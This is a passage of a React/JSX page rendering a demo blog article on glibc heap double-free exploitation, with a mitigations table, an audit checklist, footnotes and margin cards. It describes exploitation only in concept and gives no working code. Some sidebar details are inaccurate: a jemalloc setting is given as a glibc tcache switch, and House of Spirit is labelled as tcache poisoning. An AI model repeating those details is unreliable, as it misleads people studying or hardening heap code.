              <div className="overflow-x-auto">
                <table className="w-full text-[13px] border-collapse">
                  <thead>
                    <tr style={{ background: "var(--card)", color: "var(--muted-foreground)", fontFamily: "var(--font-mono)", fontSize: "11px" }}>
                      <th className="text-left px-3 py-2 border-b" style={{ borderColor: "var(--card-border)" }}>Layer</th>
                      <th className="text-left px-3 py-2 border-b" style={{ borderColor: "var(--card-border)" }}>Mechanism</th>
                      <th className="text-left px-3 py-2 border-b" style={{ borderColor: "var(--card-border)" }}>Cost</th>
                    </tr>
                  </thead>
                  <tbody>
                    {[
                      ["Code", "free(ptr); ptr=NULL; — single statement fix", "Near zero"],
                      ["Compiler", "-D_FORTIFY_SOURCE=2 / -fstack-protector", "Recompile"],
                      ["Allocator", "Safe unlink, tcache key, safe linking", "Upgrade glibc"],
                      ["Runtime", "ASLR, PIE, heap tagging (MTE)", "Platform"],
                    ].map(([a, b, c]) => (
                      <tr key={a} className="border-b last:border-0" style={{ borderColor: "var(--card-border)", background: "var(--background)" }}>
                        <td className="px-3 py-2 font-medium" style={{ color: "var(--foreground)" }}>{a}</td>
                        <td className="px-3 py-2" style={{ color: "var(--muted-foreground)" }}>{b}</td>
                        <td className="px-3 py-2" style={{ color: "var(--muted-foreground)" }}>{c}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            <p>As a checklist when you audit a C codebase for heap hygiene:</p>
            <ol className="list-decimal pl-5 space-y-1.5 my-4 text-[14px]" style={{ color: "var(--muted-foreground)" }}>
              <li>Trace every <code className="px-1 py-0.5 rounded border text-[12px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>malloc</code> to its <code className="px-1 py-0.5 rounded border text-[12px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>free</code> — flag unpaired frees.</li>
              <li>Enforce <code className="px-1 py-0.5 rounded border text-[12px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>free; null</code> idiom via clang-tidy rule.</li>
              <li>Fuzz with AddressSanitizer — double-free is caught as <code className="px-1 py-0.5 rounded border text-[12px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>attempting double-free</code>.</li>
              <li>Ship with hardened allocator in prod if latency allows.</li>
            </ol>

            <hr className="my-8" style={{ borderColor: "var(--card-border)" }} />

            <p className="text-[13px] leading-6 italic" style={{ color: "var(--muted-foreground)" }}>
              Up next — automatic exploit synthesis with <code className="px-1 py-0.5 rounded border not-italic text-[11px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>pwntools</code> + <code className="px-1 py-0.5 rounded border not-italic text-[11px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>GDB GEF</code>. This kitchen-sink article stays as the demo for all blog primitives — left index, marginalia, callouts, code, figures, tables, footnotes.
            </p>

            {/* FOOTNOTES */}
            <h2 id="footnotes" className="text-[18px] font-semibold tracking-tight mt-10 mb-3 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              Footnotes <a href="#footnotes" className="text-[13px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h2>
            <div className="rounded-[10px] border p-4 space-y-3 text-[13px] leading-6" style={{ background: "var(--card)", borderColor: "var(--card-border)", color: "var(--muted-foreground)" }}>
              <div id="fn-1" className="flex gap-2">
                <a href="#ref-1" className="shrink-0 font-mono text-[11px] px-1.5 py-0.5 rounded border" style={{ borderColor: "var(--card-border)", background: "var(--card-inner)", color: "var(--muted-foreground)" }}>[1]</a>
                <span>ptmalloc2 is glibc's default; jemalloc/tcmalloc differ in chunk headers but share aliasing primitives. Compare <code className="px-1 py-0.5 rounded border text-[11px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>jemalloc chunk header = 1 word</code>. <a href="#ref-1" className="underline">↩</a></span>
              </div>
              <div id="fn-2" className="flex gap-2">
                <span className="shrink-0 font-mono text-[11px] px-1.5 py-0.5 rounded border" style={{ borderColor: "var(--card-border)", background: "var(--card-inner)", color: "var(--muted-foreground)" }}>[2]</span>
                <span>Enscribe's “WTLLS factor” and “Recall” boxes inspired the definition + recall primitives used above. Original: <em>enscribe.dev/blog/smart-eyes-stupid-hands</em>. <a href="#" className="underline">↩</a></span>
              </div>
            </div>

          </div>

          <footer className="mt-10 pt-6 flex flex-wrap gap-2 items-center text-[12px] border-t" style={{ borderColor: "var(--card-border)", color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>
            Tags: {["heap-exploitation", "glibc", "pwn", "elf", "linux", "demo", "design-system"].map(t => <span key={t} className="px-2.5 py-1 rounded-full border" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)" }}>#{t}</span>)}
          </footer>
        </article>

        {/* RIGHT: support text / marginalia — scrolls with content, cards pinned beside relevant sections */}
        <aside ref={rightRailRef} className="hidden xl:block relative self-start" style={{ minHeight: "800px" }}>
          {/* Stack at top beside Introduction — scrolls away */}
          <div className="absolute left-0 right-0 space-y-4" style={{ top: `${asideTops.glance}px` }}>
            <div className="rounded-[12px] border p-4" style={{ background: "var(--card)", borderColor: "var(--card-border)" }}>
              <div className="text-[11px] tracking-[0.12em] font-semibold flex items-center gap-1.5" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}><span className="w-1.5 h-1.5 rounded-full" style={{ background: "var(--foreground)" }} /> SUPPORT TEXT</div>
              <div className="text-[12px] leading-5 mt-2" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-sans)" }}>
                Marginalia now <em>scrolls</em> — each card is absolutely positioned beside its section (amp → flags table, lab → exploit). Resize to recalc.
              </div>
            </div>

            <div className="rounded-[12px] border p-4" style={{ background: "var(--card)", borderColor: "var(--card-border)" }}>
              <div className="text-[12px] font-semibold flex items-center gap-2" style={{ color: "var(--foreground)", fontFamily: "var(--font-title)" }}>⚙ At a glance</div>
              <div className="text-[12.5px] leading-5 mt-2 space-y-1.5" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-sans)" }}>
                <div><span style={{ color: "var(--foreground)" }}>Primitive:</span> double-free → alias</div>
                <div><span style={{ color: "var(--foreground)" }}>Bin:</span> tcache / fastbin</div>
                <div><span style={{ color: "var(--foreground)" }}>Outcome:</span> arbitrary read/write</div>
                <div><span style={{ color: "var(--foreground)" }}>Fix:</span> null after free</div>
              </div>
              <a href="#anatomy-heap-chunk" onClick={(e) => { e.preventDefault(); scrollTo("anatomy-heap-chunk") }} className="inline-block mt-3 text-[11px] underline" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>→ Jump to anatomy</a>
            </div>
          </div>

          {/* SIDENOTE — AMP — pinned beside chunk-flags */}
          <div className="absolute left-0 right-0" style={{ top: `${asideTops.amp}px` }}>
            <div className="rounded-[12px] border p-4" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)" }}>
              <div className="text-[11px] tracking-[0.1em] font-semibold" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>SIDENOTE — AMP · beside flags table</div>
              <div className="text-[12.5px] leading-5 mt-1.5" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-sans)" }}>
                Why 3 bits? Alignment guarantees low bits are zero for 16-byte chunks, so glibc steals them — no extra header word. Free chunk's <code className="px-1 py-0.5 rounded border text-[10px]" style={{ background: "var(--card)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>fd</code> overlaps user data — that's the overwrite target.
              </div>
              <a href="#chunk-flags" onClick={(e) => { e.preventDefault(); scrollTo("chunk-flags") }} className="inline-block mt-2 text-[11px] underline" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>→ Flags table</a>
            </div>
          </div>

          {/* Lab tip — beside exploitation-lab */}
          <div className="absolute left-0 right-0" style={{ top: `${asideTops.lab}px` }}>
            <div className="rounded-[12px] border p-4" style={{ background: "#f59e0b11", borderColor: "#f59e0b33" }}>
              <div className="text-[12px] font-semibold" style={{ color: "#f59e0b", fontFamily: "var(--font-title)" }}>▣ Lab tip · beside exploit</div>
              <div className="text-[12.5px] leading-5 mt-1.5" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-sans)" }}>
                Run with <code className="px-1 py-0.5 rounded border text-[10px]" style={{ background: "var(--card)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>MALLOC_CONF=tcache:false</code> to compare classic vs modern path. Count tcache fills — 7 is the magic number per size class.
              </div>
              <a href="#exploitation-lab" onClick={(e) => { e.preventDefault(); scrollTo("exploitation-lab") }} className="inline-block mt-2 text-[11px] underline" style={{ color: "#f59e0b", fontFamily: "var(--font-mono)" }}>→ Exploitation lab</a>
            </div>
          </div>

          {/* References — beside mitigations */}
          <div className="absolute left-0 right-0" style={{ top: `${asideTops.refs}px` }}>
            <div className="rounded-[12px] border p-4" style={{ background: "var(--card)", borderColor: "var(--card-border)" }}>
              <div className="text-[12px] font-semibold" style={{ color: "var(--foreground)", fontFamily: "var(--font-title)" }}>References · beside fixes</div>
              <ul className="text-[12px] leading-5 mt-2 space-y-1 list-disc pl-4" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-sans)" }}>
                <li><a href="https://sourceware.org/glibc/wiki/MallocInternals" target="_blank" rel="noreferrer" className="underline">glibc MallocInternals</a></li>
                <li>Enscribe — Smart Eyes, Stupid Hands (TOC + marginalia pattern)</li>
                <li>“House of Spirit” — tcache poisoning</li>
              </ul>
            </div>
          </div>
        </aside>
      </div>
    </div>
  )
}
